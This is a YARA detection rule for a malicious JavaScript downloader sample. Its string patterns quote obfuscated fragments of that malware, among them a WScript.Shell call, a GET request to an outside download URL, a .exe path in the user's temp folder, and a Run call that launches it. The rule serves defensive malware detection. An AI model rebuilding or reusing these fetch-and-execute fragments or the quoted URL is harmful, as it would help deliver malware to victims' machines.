rule sig_20160329_d14497cbff183f6ab105cad14813a025 {
  meta:
    description = "datamaliciousorder - file 20160329_d14497cbff183f6ab105cad14813a025.js"
    author      = "HydraDragonAntivirus"
    reference   = "https://github.com/HydraDragonAntivirus"
    date        = "2026-04-26"
    hash1       = "a529044c147efe4feda4bfdd9dcd66310663d6f0735627e532bbe167ac7d1482"

  strings:
    $s1  = "function e() {return b[\"ExpandEnvironmentStrings\"](\"%TE\"+\"MP%/\") + \"1XgeES9rVuAZhF.exe\";};" fullword ascii
    $s2  = "for (;;){WScript[c](Y() * 11); if (q[\"readystate\"] >= 2 * 2) break;};" fullword ascii
    $s3  = "var b = function RP() {return WScript[i0](\"WScript.Shell\");}(), kP = 11;" fullword ascii
    $s4  = "q[ew](\"GET\", \"http://cngfloristsundries.co.uk/mo4erp\", false);" fullword ascii
    $s5  = "function dU(w, n){RG = RG * 1; return w - n;};" fullword ascii
    $s6  = "function ZZ(){return \"\" + C;};" fullword ascii
    $s7  = "function dJ(ry){b[\"Run\"](ry, RG, RG);};" fullword ascii
    $s8  = "function uO() {return ((r == true) && (r == Ri)) ? 1 : RG;};" fullword ascii
    $s9  = "var o = new this[\"Date\"]();" fullword ascii
    $s10 = "function i()" fullword ascii
    $s11 = "function Y(){return 22;};" fullword ascii
    $s12 = "return dU(Av, f);" fullword ascii
    $s13 = "function Lr(){return i0;};" fullword ascii
    $s14 = "function L(h) {var aO = (1, 2, 3, 4, 5, h); return aO;};" fullword ascii
    $s15 = " while (Lg){" fullword ascii
    $s16 = "var r = false;" fullword ascii
    $s17 = "r = true; " fullword ascii
    $s18 = "var c0 = false;" fullword ascii
    $s19 = "Ri = true; " fullword ascii
    $s20 = "var Ri = false;" fullword ascii

  condition:
    uint16(0) == 0x6176 and
    8 of them
}